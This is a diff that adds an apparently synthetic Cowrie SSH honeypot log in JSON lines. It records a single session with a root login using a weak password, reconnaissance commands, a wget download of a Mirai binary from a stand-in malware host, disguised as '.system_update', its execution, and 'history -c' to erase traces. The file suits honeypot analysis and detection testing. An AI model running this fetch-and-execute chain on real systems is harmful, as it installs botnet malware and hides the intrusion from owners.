@@ -1,0 +1,12 @@
+{"eventid": "cowrie.session.connect", "src_ip": "192.168.1.50", "timestamp": "2025-10-26T10:00:01.123Z", "message": "New connection: 192.168.1.50:54322 (192.168.1.5:2222) [session: a1b2c3d4]"}
+{"eventid": "cowrie.login.failed", "src_ip": "192.168.1.50", "timestamp": "2025-10-26T10:00:05.456Z", "username": "root", "password": "123", "message": "login attempt [root/123] failed", "session": "a1b2c3d4"}
+{"eventid": "cowrie.login.success", "src_ip": "192.168.1.50", "timestamp": "2025-10-26T10:00:10.789Z", "username": "root", "password": "password", "message": "login attempt [root/password] succeeded", "session": "a1b2c3d4"}
+{"eventid": "cowrie.command.input", "src_ip": "192.168.1.50", "timestamp": "2025-10-26T10:00:15.111Z", "input": "uname -a", "message": "CMD: uname -a", "session": "a1b2c3d4"}
+{"eventid": "cowrie.command.input", "src_ip": "192.168.1.50", "timestamp": "2025-10-26T10:00:20.222Z", "input": "whoami", "message": "CMD: whoami", "session": "a1b2c3d4"}
+{"eventid": "cowrie.command.input", "src_ip": "192.168.1.50", "timestamp": "2025-10-26T10:00:25.333Z", "input": "cd /tmp", "message": "CMD: cd /tmp", "session": "a1b2c3d4"}
+{"eventid": "cowrie.command.input", "src_ip": "192.168.1.50", "timestamp": "2025-10-26T10:00:30.444Z", "input": "wget http://malware-repo.xyz/bins/mirai.x86 -O .system_update", "message": "CMD: wget http://malware-repo.xyz/bins/mirai.x86 -O .system_update", "session": "a1b2c3d4"}
+{"eventid": "cowrie.session.file_download", "src_ip": "192.168.1.50", "timestamp": "2025-10-26T10:00:35.555Z", "url": "http://malware-repo.xyz/bins/mirai.x86", "outfile": ".system_update", "message": "File download attempt", "session": "a1b2c3d4"}
+{"eventid": "cowrie.command.input", "src_ip": "192.168.1.50", "timestamp": "2025-10-26T10:00:40.666Z", "input": "chmod +x .system_update", "message": "CMD: chmod +x .system_update", "session": "a1b2c3d4"}
+{"eventid": "cowrie.command.input", "src_ip": "192.168.1.50", "timestamp": "2025-10-26T10:00:45.777Z", "input": "./.system_update", "message": "CMD: ./.system_update", "session": "a1b2c3d4"}
+{"eventid": "cowrie.command.input", "src_ip": "192.168.1.50", "timestamp": "2025-10-26T10:00:50.888Z", "input": "history -c", "message": "CMD: history -c", "session": "a1b2c3d4"}
+{"eventid": "cowrie.session.closed", "src_ip": "192.168.1.50", "timestamp": "2025-10-26T10:00:55.999Z", "message": "Connection lost", "session": "a1b2c3d4"}
